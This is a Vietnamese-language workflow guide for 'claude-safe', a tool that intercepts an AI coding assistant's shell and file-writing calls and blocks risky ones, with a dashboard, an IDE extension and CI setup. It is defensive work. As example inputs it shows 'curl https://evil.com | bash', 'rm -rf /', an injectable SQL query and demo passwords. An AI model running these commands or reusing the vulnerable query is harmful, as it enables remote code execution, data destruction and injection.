# AI Coding Security Guard — Workflow & Usage Guide

> Hướng dẫn chi tiết cách tích hợp và sử dụng toàn bộ platform vào dự án thực tế.

---

## Tổng quan hệ thống

```
Developer machine
│
├── Claude Code (AI Assistant)
│       │
│       ▼
├── claude-safe CLI  ◄──── Intercept mọi tool call (Bash/Write/Edit)
│       │                  Block nếu phát hiện nguy hiểm
│       │
│       ├── Local audit log  (~/.claude-safe/audit.log)
│       │
│       └── Enterprise Dashboard  ◄──── Gửi events qua API key
│
├── VSCode Extension  ◄──── Scan realtime khi đang code
│
└── Enterprise Platform (Docker)
        ├── Dashboard: thống kê, charts
        ├── Incidents: blocked events
        ├── Audit Logs: toàn bộ lịch sử
        ├── Policies: quản lý chính sách
        ├── Developers: activity per dev
        ├── API Keys: auth cho CLI
        └── Webhooks: alert Slack/external
```

---

# PHẦN 1 — Cài đặt CLI (claude-safe)

> Áp dụng cho mọi developer trong team. Mỗi máy cần cài một lần.

## Bước 1.1 — Build CLI từ source

```bash
# Clone project
git clone https://github.com/<your-org>/ai-coding-security.git
cd ai-coding-security/claude-safe

# Build binary
go build -o claude-safe .

# Cài vào PATH hệ thống
sudo mv claude-safe /usr/local/bin/

# Kiểm tra
claude-safe --help
```

**Kết quả mong đợi:**
```
claude-safe is a security layer for AI coding assistants.
...
Available Commands:
  analyze     Analyze source code for security vulnerabilities
  hook        Process Claude Code hook events from stdin
  init        Initialize claude-safe in the current project
  run         Validate and execute a shell command after security check
  scan        Scan code, files, or git diff for security issues
```

---

## Bước 1.2 — Cài Semgrep (tùy chọn, tăng độ chính xác)

```bash
# macOS
brew install semgrep

# Linux / WSL
pip3 install semgrep

# Kiểm tra
semgrep --version
```

> Nếu không có Semgrep, `claude-safe` tự động fallback về regex engine. Vẫn hoạt động bình thường.

---

# PHẦN 2 — Tích hợp vào dự án

> Chạy trong thư mục gốc của project cần bảo vệ.

## Bước 2.1 — Init project

```bash
cd /path/to/your-project

claude-safe init
```

**Lệnh này tự động tạo:**
```
your-project/
├── .claude/
│   └── settings.json          ← Claude Code hooks config
├── .claude-safe/
│   ├── policy.yaml            ← Security policy
│   └── audit.log              ← Local audit log (auto-created khi dùng)
└── .git/hooks/
    └── pre-commit             ← Git hook: block commit nếu có secret
```

**Nội dung `.claude/settings.json` được tạo:**
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "claude-safe hook" }]
      },
      {
        "matcher": "Write",
        "hooks": [{ "type": "command", "command": "claude-safe hook" }]
      },
      {
        "matcher": "Edit",
        "hooks": [{ "type": "command", "command": "claude-safe hook" }]
      }
    ]
  }
}
```

> Từ thời điểm này, **mọi lệnh Claude Code chạy đều qua `claude-safe` trước khi thực thi**.

---

## Bước 2.2 — Tuỳ chỉnh policy

```bash
# Xem policy hiện tại
cat .claude-safe/policy.yaml
```

```yaml
# .claude-safe/policy.yaml
block_dangerous_commands: true   # Block rm -rf, curl|bash, ...
block_secrets: true              # Block AWS keys, tokens, ...
max_risk_level: medium           # LOW / MEDIUM / HIGH / CRITICAL
allow_sudo: false                # Có cho phép sudo không
audit_log: true                  # Ghi audit log local
audit_log_path: .claude-safe/audit.log

allow_list:                      # Lệnh luôn được phép dù có risk
  - "git status"
  - "git log"
  - "npm test"
  - "go test ./..."
```

**Các mức `max_risk_level`:**

| Giá trị | Ý nghĩa |
|---|---|
| `low` | Nghiêm ngặt nhất — block cả LOW risk |
| `medium` | Mặc định — block từ MEDIUM trở lên |
| `high` | Lỏng hơn — chỉ block HIGH + CRITICAL |
| `critical` | Lỏng nhất — chỉ block CRITICAL |

---

# PHẦN 3 — Sử dụng hàng ngày

## 3.1 — Claude Code tự động (hooks)

Không cần làm gì thêm. Khi Claude Code chạy lệnh, `claude-safe` tự intercepte:

```
Claude Code muốn chạy: rm -rf /tmp/build
        │
        ▼
claude-safe hook (đọc từ stdin)
        │
        ├── Command Risk: CRITICAL
        ├── Risk Score: 50/100
        └── [BLOCKED] Risk level HIGH exceeds policy maximum medium
        
Claude Code KHÔNG chạy lệnh này.
```

```
Claude Code muốn ghi file: config.py
Content: AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE
        │
        ▼
claude-safe hook
        │
        ├── Secret detected: AWS Access Key (CRITICAL)
        └── [BLOCKED] Writing config.py: Risk level HIGH exceeds maximum
        
File KHÔNG được ghi.
```

---

## 3.2 — Scan thủ công

### Scan một file
```bash
claude-safe scan --file src/database.py
```

### Scan nhiều file
```bash
# Scan toàn bộ directory
find . -name "*.py" -exec claude-safe scan --file {} \;

# Hoặc từng file cụ thể
claude-safe scan --file auth.go
claude-safe scan --file api/handlers.js
```

### Scan inline text
```bash
claude-safe scan --text "password = 'mysecret123'"
```

### Scan git diff (trước khi commit)
```bash
# Scan các thay đổi chưa staged
claude-safe scan --git-diff

# Scan staged changes (sẽ được commit)
claude-safe scan --staged
```

### Output JSON (cho CI/CD)
```bash
claude-safe analyze --file src/login.js --json
```

```json
{
  "findings": [
    {
      "VulnType": "SQL_INJECTION",
      "Severity": "CRITICAL",
      "Line": 24,
      "Code": "db.query(`SELECT * FROM users WHERE id=${req.params.id}`)",
      "Description": "Template literal in SQL query — SQL injection risk",
      "Remediation": "Use parameterised queries / prepared statements"
    }
  ],
  "language": "javascript",
  "risk_level": "CRITICAL",
  "risk_score": 40
}
```

---

## 3.3 — Chạy lệnh an toàn (thay thế trực tiếp)

```bash
# Thay vì chạy trực tiếp:
rm -rf /old-build

# Chạy qua claude-safe:
claude-safe run rm -rf /old-build
# → Sẽ kiểm tra trước, hỏi xác nhận nếu nguy hiểm
```

---

## 3.4 — Xem audit log local

```bash
# Xem 20 event gần nhất
tail -20 .claude-safe/audit.log | python3 -m json.tool

# Xem chỉ các blocked events
grep '"blocked":true' .claude-safe/audit.log | tail -10

# Đếm số lần bị block hôm nay
grep '"blocked":true' .claude-safe/audit.log | grep "$(date +%Y-%m-%d)" | wc -l
```

---

## 3.5 — Pre-commit hook (tự động khi commit)

Sau khi `claude-safe init`, mỗi lần `git commit`:

```bash
git add .
git commit -m "feat: add payment integration"
# → claude-safe tự scan staged changes
# → Block nếu phát hiện secret trong code
```

---

# PHẦN 4 — VSCode Extension

## Bước 4.1 — Cài extension (local build)

```bash
cd ai-coding-security/vscode-claude-safe

# Cài dependencies
npm install

# Build
npm run compile
```

Trong VSCode:
1. Mở Command Palette: `Ctrl+Shift+P` (hoặc `Cmd+Shift+P` trên Mac)
2. Chọn: **Extensions: Install from VSIX** (nếu có file `.vsix`)
   — hoặc —
   Nhấn `F5` để chạy **Extension Development Host**

---

## Bước 4.2 — Cấu hình extension

Vào **Settings** (`Ctrl+,`) → tìm `claude-safe`:

| Setting | Default | Mô tả |
|---|---|---|
| `claudeSafe.enabled` | `true` | Bật/tắt extension |
| `claudeSafe.binaryPath` | `claude-safe` | Đường dẫn tới binary |
| `claudeSafe.policyPath` | `.claude-safe/policy.yaml` | Đường dẫn policy |
| `claudeSafe.autoScanOnSave` | `true` | Auto scan khi save file |
| `claudeSafe.maxNotificationSeverity` | `HIGH` | Mức nào thì hiện thông báo |

---

## Bước 4.3 — Sử dụng extension

**Tự động:** Extension scan mỗi khi bạn save file (`Ctrl+S`).

**Thủ công:**
- `Ctrl+Shift+P` → `Claude Safe: Scan Current File`
- `Ctrl+Shift+P` → `Claude Safe: Scan Workspace`
- `Ctrl+Shift+P` → `Claude Safe: Clear Findings`

**Đọc kết quả:**
- Tab **Problems** (`Ctrl+Shift+M`): danh sách tất cả findings
- Sidebar **CLAUDE SAFE**: tree view findings theo file
- Underline đỏ/vàng ngay trong editor trên dòng có vấn đề
- Status bar (góc dưới bên trái): `🛡 3 findings` / `✓ Clean`

---

# PHẦN 5 — Enterprise Dashboard

> Dành cho team lead / security manager / toàn team.

## Bước 5.1 — Khởi động platform

```bash
cd ai-coding-security/enterprise

# Lần đầu (build images + migrate DB + seed data)
docker-compose up --build

# Lần sau
docker-compose up -d

# Xem logs
docker-compose logs -f backend
docker-compose logs -f frontend
```

**Services:**
| Service | URL | Mô tả |
|---|---|---|
| Frontend | http://localhost:3000 | Dashboard UI |
| Backend API | http://localhost:8080 | REST API |
| PostgreSQL | localhost:5432 | Database |

---

## Bước 5.2 — Đăng nhập

Truy cập **http://localhost:3000**

**Demo accounts có sẵn** (password: `password123`):

| Email | Role | Quyền |
|---|---|---|
| `admin@example.com` | Admin | Toàn quyền |
| `analyst@example.com` | Analyst | Xem + quản lý policy |
| `dev1@example.com` | Developer | Chỉ xem activity của mình |

---

## Bước 5.3 — Tạo tài khoản thực

Dùng API trực tiếp (chưa có UI register):

```bash
# Tạo user mới qua DB
docker exec -it enterprise-postgres-1 psql -U claude_safe -d claude_safe -c "
INSERT INTO users (email, name, role, password_hash) VALUES (
  'yourname@company.com',
  'Your Name',
  'developer',
  '\$2a\$10\$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
);"
# Hash trên = bcrypt của "password123"
# Đổi password sau khi login (chưa có UI, dùng API)
```

---

## Bước 5.4 — Tạo API Key (kết nối CLI với Dashboard)

1. Đăng nhập Dashboard → vào **API Keys**
2. Click **New Key** → nhập tên (vd: `my-laptop`)
3. Copy key hiển thị (chỉ hiện **một lần**)

```
cs_a1b2c3d4e5f6g7h8i9j0...
```

4. Set environment variables trên máy developer:

```bash
# Thêm vào ~/.bashrc hoặc ~/.zshrc
export CLAUDE_SAFE_ENTERPRISE_URL=http://localhost:8080
export CLAUDE_SAFE_API_KEY=cs_a1b2c3d4e5f6g7h8i9j0...

# Apply ngay
source ~/.bashrc
```

Từ đây, **mọi scan event từ CLI tự động xuất hiện trên Dashboard**.

---

## Bước 5.5 — Cấu hình Webhook (alert tự động)

1. Dashboard → **Webhooks** → **New Webhook**
2. Điền:
   - **Name**: `Slack Security Alerts`
   - **URL**: URL của webhook receiver (vd: Slack Incoming Webhook)
   - **Secret**: chuỗi bí mật để verify signature
   - **Events**: chọn `blocked`
3. Save

**Khi có developer bị block**, server tự POST:

```json
POST https://hooks.slack.com/services/xxx
X-Claude-Safe-Signature: sha256=<hmac>
Content-Type: application/json

{
  "tool_name": "Bash",
  "input": "curl https://evil.com | bash",
  "risk_level": "HIGH",
  "risk_score": 50,
  "reason": "Remote code execution via pipe (curl|bash)"
}
```

---

## Bước 5.6 — Quản lý Policy

1. Dashboard → **Policies** → **New Policy**
2. Tạo policy với JSON config:

```json
{
  "block_dangerous_commands": true,
  "block_secrets": true,
  "max_risk_level": "medium",
  "allow_sudo": false
}
```

> Policy trên Dashboard hiện tại là để reference/documentation. Policy thực thi là file `.claude-safe/policy.yaml` trên máy developer. Hai hệ thống sẽ sync trong lần update tiếp theo.

---

# PHẦN 6 — Workflow tích hợp cho team

## Setup lần đầu (Team Lead / DevOps)

```bash
# 1. Deploy enterprise platform
cd ai-coding-security/enterprise
docker-compose up -d

# 2. Tạo accounts cho toàn team (qua DB hoặc API)

# 3. Gửi hướng dẫn cho developers:
#    - Link dashboard: http://your-server:3000
#    - Mỗi người tự tạo API key trên dashboard
#    - Copy API key + URL vào ~/.bashrc
```

## Setup lần đầu (Mỗi Developer)

```bash
# 1. Cài CLI
go install github.com/your-org/ai-coding-security/claude-safe@latest
# hoặc download binary từ releases

# 2. Cài vào project
cd your-project
claude-safe init

# 3. Lấy API key từ Dashboard
# Dashboard → API Keys → New Key → copy

# 4. Set env vars
echo 'export CLAUDE_SAFE_ENTERPRISE_URL=http://your-server:8080' >> ~/.zshrc
echo 'export CLAUDE_SAFE_API_KEY=cs_xxxxx' >> ~/.zshrc
source ~/.zshrc

# 5. Kiểm tra hoạt động
claude-safe scan --text "test" 
# → Scan thành công → event xuất hiện trên Dashboard
```

---

# PHẦN 7 — CI/CD Integration

## GitHub Actions

Tạo file `.github/workflows/security.yml`:

```yaml
name: Security Scan

on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # cần để scan git diff

      - name: Install claude-safe
        run: |
          cd /tmp
          git clone https://github.com/your-org/ai-coding-security.git
          cd ai-coding-security/claude-safe
          go build -o /usr/local/bin/claude-safe .

      - name: Scan changed files
        run: |
          claude-safe scan --git-diff --json > scan-report.json
          cat scan-report.json

      - name: Check for critical findings
        run: |
          CRITICAL=$(grep -c '"Severity":"CRITICAL"' scan-report.json || echo 0)
          if [ "$CRITICAL" -gt 0 ]; then
            echo "❌ Found $CRITICAL CRITICAL security issues"
            exit 1
          fi
          echo "✅ No critical security issues found"
```

---

## Pre-commit (local, tất cả developers)

File `.git/hooks/pre-commit` được `claude-safe init` tạo tự động:

```bash
#!/bin/bash
claude-safe scan --staged
if [ $? -ne 0 ]; then
  echo "❌ Commit blocked by claude-safe. Fix security issues first."
  exit 1
fi
```

---

# PHẦN 8 — Tất cả Commands

## CLI Commands

```bash
# ── INIT ─────────────────────────────────────────────────────
claude-safe init
# Tạo .claude/settings.json + .claude-safe/policy.yaml + git hooks

# ── SCAN ─────────────────────────────────────────────────────
claude-safe scan --file <path>          # Scan một file
claude-safe scan --git-diff             # Scan unstaged changes
claude-safe scan --staged               # Scan staged changes
claude-safe scan --text "content"       # Scan inline text
echo "content" | claude-safe scan       # Scan từ stdin

# ── ANALYZE (code vulnerability) ─────────────────────────────
claude-safe analyze --file <path>       # Analyze với human output
claude-safe analyze --file <path> --json   # Analyze với JSON output

# ── RUN (validated execution) ────────────────────────────────
claude-safe run <command>               # Run command qua security check

# ── HOOK (dùng bởi Claude Code, không dùng trực tiếp) ────────
echo '<json>' | claude-safe hook

# ── GLOBAL FLAGS ─────────────────────────────────────────────
--policy <path>    # Chỉ định policy file (default: .claude-safe/policy.yaml)
--help             # Help
```

## Docker Commands (Enterprise)

```bash
# Khởi động
docker-compose up -d

# Dừng
docker-compose down

# Dừng + xóa data (reset hoàn toàn)
docker-compose down -v

# Xem logs
docker-compose logs -f backend
docker-compose logs -f frontend
docker-compose logs postgres

# Restart một service
docker-compose restart backend

# Chạy SQL trực tiếp
docker exec -it enterprise-postgres-1 psql -U claude_safe -d claude_safe
```

## API Endpoints (Backend)

```bash
BASE=http://localhost:8080

# Auth
POST $BASE/api/auth/login         # { email, password } → { token, user }
GET  $BASE/api/auth/me            # → user info (cần Bearer token)

# Dashboard
GET  $BASE/api/stats              # → DashboardStats

# Incidents (blocked events)
GET  $BASE/api/incidents          # ?limit=20&offset=0&risk_level=CRITICAL

# Audit logs
GET  $BASE/api/audit-logs         # ?limit=50&offset=0

# Developers
GET  $BASE/api/developers
GET  $BASE/api/developers/{id}/activity

# Policies
GET    $BASE/api/policies
POST   $BASE/api/policies         # admin/analyst only
PUT    $BASE/api/policies/{id}    # admin/analyst only
DELETE $BASE/api/policies/{id}    # admin only

# API Keys
GET    $BASE/api/api-keys
POST   $BASE/api/api-keys         # { name }
DELETE $BASE/api/api-keys/{id}

# Webhooks
GET    $BASE/api/webhooks
POST   $BASE/api/webhooks         # { name, url, secret, events }
DELETE $BASE/api/webhooks/{id}

# Ingest (từ CLI, dùng X-API-Key header)
POST   $BASE/api/events           # { user_email, tool_name, input, risk_level, ... }
```

---

## Ví dụ: Ingest event thủ công

```bash
# Gửi event vào Dashboard từ CLI/script
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Ingest qua JWT
curl -X POST http://localhost:8080/api/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "user_email": "dev1@example.com",
    "tool_name": "Bash",
    "input": "echo hello",
    "risk_level": "SAFE",
    "risk_score": 0,
    "blocked": false,
    "reason": "",
    "findings": []
  }'

# Ingest qua API Key (cho CLI)
curl -X POST http://localhost:8080/api/events \
  -H "X-API-Key: cs_your_api_key" \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "Bash",
    "input": "rm -rf /",
    "risk_level": "CRITICAL",
    "risk_score": 100,
    "blocked": true,
    "reason": "Deletes root filesystem"
  }'
```

---

# PHẦN 9 — Troubleshooting

## Claude Code không block lệnh

```bash
# Kiểm tra hooks có được load không
cat .claude/settings.json

# Test hook thủ công
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | claude-safe hook
# Phải thấy: [BLOCKED] ...

# Kiểm tra claude-safe có trong PATH
which claude-safe
```

## Dashboard không nhận events từ CLI

```bash
# Kiểm tra env vars
echo $CLAUDE_SAFE_ENTERPRISE_URL
echo $CLAUDE_SAFE_API_KEY

# Test gửi event thủ công
claude-safe scan --text "test"
# Vào Dashboard → Audit Logs → xem có event mới không

# Kiểm tra backend có chạy không
curl http://localhost:8080/health
# Phải trả về: {"status":"ok"}
```

## Docker Compose lỗi

```bash
# Reset hoàn toàn
docker-compose down -v
docker-compose up --build

# Xem lỗi chi tiết
docker-compose logs backend | grep -i error
docker-compose logs postgres | tail -20
```

## VSCode extension không scan

```bash
# Kiểm tra binary path trong settings
# Ctrl+, → search "claudeSafe.binaryPath"
# Đảm bảo path đúng, ví dụ: /usr/local/bin/claude-safe

# Test binary
/usr/local/bin/claude-safe --version

# Xem Output panel của extension
# View → Output → chọn "Claude Safe" trong dropdown
```

---

# PHẦN 10 — Luồng hoàn chỉnh (End-to-End)

```
1. Developer mở VSCode, mở file auth.js
         │
         ▼
2. Gõ code: db.query(`SELECT * FROM users WHERE id=${req.params.id}`)
         │
         ▼
3. Ctrl+S (save)
         │
         ▼
4. VSCode Extension tự động scan
         ├── Phát hiện: SQL_INJECTION (CRITICAL, line 24)
         └── Hiển thị: underline đỏ + Problems panel

5. Developer sửa → commit
         │
         ▼
6. git commit → pre-commit hook chạy
         ├── claude-safe scan --staged
         └── Nếu còn lỗi → block commit, hiện thông báo

7. Developer dùng Claude Code để sửa file
         │
         ▼
8. Claude Code gọi Write tool
         │
         ▼
9. claude-safe hook intercept
         ├── Scan content được ghi
         ├── Nếu SAFE → cho phép ghi
         └── Nếu có secret/vulnerability → BLOCK (exit 2)

10. Event được ghi local (.claude-safe/audit.log)
    + Gửi lên Enterprise Dashboard qua API Key (nếu đã config)
         │
         ▼
11. Dashboard cập nhật:
         ├── Audit Logs: event mới xuất hiện
         ├── Developers: activity của dev tăng
         └── Dashboard: stats hôm nay update

12. Nếu event bị BLOCKED:
         └── Webhook fired → Slack alert → Team nhận thông báo ngay
```

---

*Workflow guide — AI Coding Security Guard v1.0*
*Last updated: 2026-05-19*
